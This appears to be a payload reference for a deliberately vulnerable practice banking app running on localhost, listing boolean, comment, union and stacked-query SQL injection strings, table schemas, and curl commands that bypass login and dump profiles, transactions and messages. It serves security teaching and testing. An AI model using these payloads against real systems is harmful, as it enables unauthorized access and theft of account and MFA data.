# SQL Injection Payloads Reference

This document lists all SQL injection techniques that work on the vulnerable endpoints.

## 🔓 Supported SQL Injection Techniques

### 1. Boolean-based SQL Injection (OR 1=1)

**Login Endpoint:**
- Email: `admin@finovia.com`
- Password: `' OR '1'='1`
- Password: `' OR 1=1`
- Password: `' OR '1'='1--`

**Profiles Endpoint:**
```
GET /api/vuln-profiles?account_number=' OR '1'='1
GET /api/vuln-profiles?email=' OR 1=1
```

**Transactions Endpoint:**
```
GET /api/vuln-transactions?account_number=' OR '1'='1
GET /api/vuln-transactions?user_id=' OR 1=1
```

**Contact Messages Endpoint:**
```
GET /api/vuln-contact-messages?email=' OR '1'='1
GET /api/vuln-contact-messages?user_id=' OR 1=1
```

### 2. Comment-based SQL Injection

**Single-line Comments (--):**
- Email: `admin@finovia.com'--`
- Password: `anything`
- URL: `?account_number=ACC001'--`

**Multi-line Comments (/* */):**
- Email: `admin@finovia.com'/*`
- Password: `anything`
- URL: `?account_number=ACC001'/*`

### 3. Union-based SQL Injection

**Login:**
- Email: `' UNION SELECT * FROM profiles --`
- Password: `anything`

**Profiles:**
```
GET /api/vuln-profiles?account_number=' UNION SELECT id, full_name, account_number, balance, email, phone, mfa_enabled, mfa_code FROM profiles --
```

**Transactions:**
```
GET /api/vuln-transactions?account_number=' UNION SELECT id, from_user_id, to_user_id, from_account_number, to_account_number, amount, transaction_type, status, description, created_at FROM transactions --
```

**Contact Messages:**
```
GET /api/vuln-contact-messages?email=' UNION SELECT id, user_id, name, email, subject, message, created_at FROM contact_messages --
```

### 4. Stacked Queries (Multiple Statements)

**Login:**
- Email: `admin@finovia.com'; SELECT * FROM profiles; --`
- Password: `anything`

**All Endpoints:**
- Add `;` followed by another SQL statement
- Example: `?account_number=ACC001'; SELECT * FROM profiles; --`

## 📋 Table Structures

### profiles
- id (uuid)
- full_name (text)
- account_number (text)
- balance (numeric)
- email (text)
- phone (text)
- mfa_enabled (boolean)
- mfa_code (text)

### transactions
- id (uuid)
- from_user_id (uuid)
- to_user_id (uuid)
- from_account_number (text)
- to_account_number (text)
- amount (numeric)
- transaction_type (text)
- status (text)
- description (text)
- created_at (timestamp)

### contact_messages
- id (uuid)
- user_id (uuid)
- name (text)
- email (text)
- subject (text)
- message (text)
- created_at (timestamp)

## 🎯 Testing Examples

### Test 1: Bypass Authentication
```bash
curl -X POST http://localhost:8080/api/vuln-login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@finovia.com","password":"'\'' OR '\''1'\''='\''1"}'
```

### Test 2: Extract All Profiles
```bash
curl "http://localhost:8080/api/vuln-profiles?account_number=' OR '1'='1"
```

### Test 3: Extract All Transactions
```bash
curl "http://localhost:8080/api/vuln-transactions?account_number=' OR '1'='1"
```

### Test 4: Extract All Contact Messages
```bash
curl "http://localhost:8080/api/vuln-contact-messages?email=' OR '1'='1"
```

## ⚠️ Response Format

All endpoints return:
```json
{
  "query": "SELECT ... WHERE ...",
  "sqlInjectionDetected": true,
  "injectionType": "Boolean-based (OR 1=1)",
  "results": [...],
  "count": 5,
  "warning": "⚠️ Boolean-based (OR 1=1) SQL Injection detected! All profiles exposed!"
}
```

## 🔍 Detection

The endpoints detect and report:
- **Boolean-based (OR 1=1)**: Classic OR condition bypass
- **Comment-based (--)**: Single-line comment injection
- **Comment-based (/* */)**: Multi-line comment injection
- **Union-based**: UNION SELECT injection
- **Stacked queries**: Multiple statement execution



